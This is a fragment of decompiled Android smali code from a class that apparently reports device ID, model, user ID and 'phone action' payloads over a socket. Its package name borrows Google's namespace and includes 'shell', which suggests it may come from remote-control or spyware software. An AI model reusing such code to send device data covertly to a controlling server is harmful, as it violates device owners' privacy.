.method public sendActionInfo(Ljava/lang/String;Lorg/json/JSONObject;I)V
    .locals 4
    .param p1, "socketId"    # Ljava/lang/String;
    .param p2, "payload"    # Lorg/json/JSONObject;
    .param p3, "type"    # I

    .line 160
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 161
    .local v0, "logObj":Lorg/json/JSONObject;
    const-string v1, "timestamp"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 163
    const-string v1, "type"

    if-nez p3, :cond_0

    .line 164
    :try_start_1
    const-string v2, "error"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_0

    .line 165
    :cond_0
    const/4 v2, 0x1

    if-ne p3, v2, :cond_1

    .line 166
    const-string v2, "info"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_0

    .line 168
    :cond_1
    const-string v2, "unknown"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 170
    :goto_0
    const-string v1, "toClient"

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 171
    const-string v1, "UserId"

    sget-object v2, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 172
    const-string v1, "DeviceId"

    iget-object v2, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-static {v2}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 173
    const-string v1, "DeviceName"

    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getModel()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 174
    const-string v1, "payload"

    invoke-virtual {v0, v1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 175
    const-string v1, "phone_action_info"

    invoke-virtual {p0, v1, v0}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    .line 179
    .end local v0    # "logObj":Lorg/json/JSONObject;
    nop

    .line 180
    return-void

    .line 177
    :catch_0
    move-exception v0

    .line 178
    .local v0, "e":Lorg/json/JSONException;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method

.method public sendSocketLog(Ljava/lang/String;I)V
    .locals 4
    .param p1, "message"    # Ljava/lang/String;
    .param p2, "type"    # I

    .line 113
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 114
    .local v0, "logObj":Lorg/json/JSONObject;
    const-string v1, "timestamp"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 116
    const-string v1, "type"

    if-nez p2, :cond_0

    .line 117
    :try_start_1
    const-string v2, "error"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_0

    .line 118
    :cond_0
    const/4 v2, 0x1

    if-ne p2, v2, :cond_1

    .line 119
    const-string v2, "info"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_0

    .line 121
    :cond_1
    const-string v2, "unknown"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 123
    :goto_0
    const-string v1, "UserId"

    sget-object v2, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 124
    const-string v1, "DeviceId"

    iget-object v2, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-static {v2}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 125
    const-string v1, "DeviceName"

    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getModel()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 126
    const-string v1, "message"

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 127
    const-string v1, "client_log"

    invoke-virtual {p0, v1, v0}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    .line 131
    .end local v0    # "logObj":Lorg/json/JSONObject;
    nop

    .line 132
    return-void

    .line 129
    :catch_0
    move-exception v0

    .line 130
    .local v0, "e":Lorg/json/JSONException;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method

.method public setCallback(Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;)V
    .locals 0
    .param p1, "callback"    # Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;

    .line 82
    iput-object p1, p0, Lcom/google/xinoshell/connection/ManageSocket;->callback:Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;

    .line 83
    return-void
.end method
